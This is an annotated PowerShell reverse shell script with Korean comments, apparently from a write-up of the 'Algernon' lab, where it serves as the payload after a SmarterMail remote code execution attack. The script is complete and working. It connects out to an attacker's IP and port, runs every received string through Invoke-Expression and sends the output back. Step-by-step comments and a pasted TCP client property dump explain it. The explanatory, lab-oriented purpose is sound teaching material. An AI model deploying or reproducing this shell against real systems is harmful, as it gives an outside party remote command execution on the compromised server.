# PowerShell Reverse Shell (Algernon write-up)
#
# SmarterMail RCE 공격(test.py)이 만들어준 PowerShell 페이로드를 실행하기 위해
# 대상 Windows 서버에서 동작하는 리버스 셸 리스너 스크립트다.
#
# 이 스크립트는 아래와 같은 방식으로 동작한다.
#   1. 공격자의 주소(IP와 포트)로 TCP 연결을 맺는다.
#   2. 공격자가 접속하면, 보내온 내용을 PowerShell 명령어로 실행한다.
#   3. 실행 결과를 다시 공격자에게 전송한다.
# 따라서 공격자가 nc 같은 프로그램으로 접속하면,
# 우리가 입력한 명령을 그대로 실행할 수 있다.

# ── 1단계: 공격자와의 TCP 연결 ───────────────────────────────
# '<IP>', '<PORT>' 자리에 공격자의 IP 주소와 포트를 입력한다.
$client = New-Object System.Net.Sockets.TCPClient('<IP>', <PORT>)

# ── 2단계: 연결 확인 ────────────────────────────────────────
# 새로 만든 클라이언트가 제대로 연결되어 있는지 확인한다.
$client

Client              : System.Net.Sockets.Socket
# 지금 바로 읽을 수 있는 수신 버퍼에 들어온 바이트 수
Available           : 0
# TCP 연결 상태 여부
Connected           : True
# 소켓 정보 독점 연결 여부로 클라이언트에서는 크게 상관 X
ExclusiveAddressUse : False
# 수신 버퍼의 크기(64KB)
ReceiveBufferSize   : 65536
SendBufferSize      : 65536
# 수신을 기다릴 때의 최대 시간(0 = 무제한)
ReceiveTimeout      : 0
SendTimeout         : 0
# 소켓을 닫을 때 남은 데이터를 처리하는 방식
# (linger: 닫을 때 버퍼에 남은 데이터를 보낼지 여부)
LingerState         : System.Net.Sockets.LingerOption
# Nagle 알고리즘 사용 여부 (전송량을 모아 보내는 최적화)
NoDelay             : False

# ── 3단계: 스트림과 수신용 버퍼 준비 ─────────────────────────
# 클라이언트에 연결된 네트워크 스트림을 읽고 쓸 수 있게 만든다.
$stream = $client.GetStream()

# 이후 데이터를 담아두는 바이트 배열.
# 0..65535까지 65,536칸, 모두 0으로 초기화한다. (64KB)
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }

# ── 4단계: 데이터 수신 및 명령 실행 루프 ──────────────────
# 계속 들어오는 데이터를 무한히 기다린다.
# Stream.Read는 읽어온 바이트 수를 반환하며,
# 더 이상 읽을 데이터가 없으면 0을 반환한다(연결 종료 신호).
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {

    # 4-1. 이번에 읽어온 바이트를 문자열로 변환한다. (ASCII 인코딩)
    #
    # GetString은 "바이트 배열(byte[])을 문자열(string)로 바꿔주는" 내장 기능이다.
    # 컴퓨터는 문자를 그대로 저장하지 않고, 어떤 문자에 해당하는 숫자(바이트)의
    # 배열로 저장하기 때문에 변환이 필요하다.
    #
    # 호출 형태는 GetString(byte[] bytes, int index, int count)다.
    #   bytes  : 변환할 바이트 배열          ($bytes)
    #   index  : 배열에서 읽을 시작 위치    (0)
    #   count   : 읽을 바이트 개수          ($i)
    # 즉, $bytes 배열의 0번째 위치부터 $i개의 바이트만 문자열로 만든다.
    # ($i는 Read가 반환한 값이므로, 이번에 온 데이터만 포함된다)
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)

    # 4-2. 받은 문자열을 PowerShell 명령어로 실행한다 (iex = Invoke-Expression).
    # 2>&1: 표준 에러(stderr)를 결과 출력으로 합친다 (에러 메시지도 결과에 포함).
    # Out-String: 실행 결과를 하나의 문자열로 합친다.
    $sendback = (iex $data 2>&1 | Out-String)

    # 4-3. 실행 결과 뒤에 현재 위치를 알려주는 PowerShell 프롬프트를 붙인다.
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "

    # 4-4. 결과를 다시 전송할 수 있도록 바이트 배열로 변환한다.
    # ASCII 인코딩을 사용한다.
    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2)

    # 4-5. 변환된 결과를 네트워크로 보내고, 전송 버퍼를 비운다.
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}

# ── 5단계: 연결 종료 ──────────────────────────────────────
# 공격자와의 연결을 닫고 스크립트를 종료한다.
$client.Close()
